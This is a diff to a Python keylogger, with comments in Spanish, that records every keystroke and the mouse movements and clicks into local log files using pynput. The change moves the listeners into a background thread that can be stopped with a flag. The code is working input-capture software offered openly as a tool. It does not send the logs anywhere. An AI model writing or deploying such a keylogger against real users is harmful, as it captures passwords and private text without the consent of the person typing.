@@ -1,8 +1,10 @@
 # Librerías necesarias
 import os
 import time
+import threading
 from datetime import datetime
 from pynput import keyboard, mouse
+
 
 # Clase del Keylogger
 class Keylog:
@@ -13,11 +15,14 @@ class Keylog:
         self.mouselog = os.path.join(os.getcwd(), "mouse.log")
         self.keyboard_listener = None
         self.mouse_listener = None
+        self.running_thread = False
+    
     def gettime():
         "Devuelve la hora actual"
         time = datetime.now()
         format_time = time.strftime("%d/%m/%Y, %H:%M:%S")
         return format_time
+
     def pathCheck(self):
         "Verifica si existe el archivo keys.log y mouse.log, si no los crea"
         if not os.path.exists(self.keyslog):
@@ -32,17 +37,32 @@ class Keylog:
             open(self.keyslog, "w").close()
             time.sleep(0.5)
             print(f"{self.mouselog} creado")
+            
     def start_listening(self):
-        "Inicia los listeners de teclado y mouse"
+        self.running_thread = True
+
         self.keyboard_listener = keyboard.Listener(on_press=self.keylogger)
         self.mouse_listener = mouse.Listener(on_move=self.mouselogger, on_click=self.mouseclick)
+
         self.keyboard_listener.start()
         self.mouse_listener.start()
+
         print("Escuchando teclas y mouse...")
 
-        self.keyboard_listener.join()
-        self.mouse_listener.join()
+        while self.running_thread:
+            time.sleep(0.1)
 
+        self.keyboard_listener.stop()
+        self.mouse_listener.stop()
+        print("Detenido")
+
+        
+    def listen_thread(self):
+        self.thread_log = threading.Thread(target=self.start_listening)
+        self.thread_log.start()
+        
+    def stop_thread(self):
+        self.running_thread = False
     def keylogger(self, key):
         "Captura las teclas presionadas y las guarda en el log"
         try:
@@ -77,7 +97,7 @@ class Keylog:
 def main():
     keylogger = Keylog()
     keylogger.pathCheck()
-    keylogger.start_listening()
+    keylogger.listen_thread()
 
 if __name__ == "__main__":
     print("Keylogger iniciado")
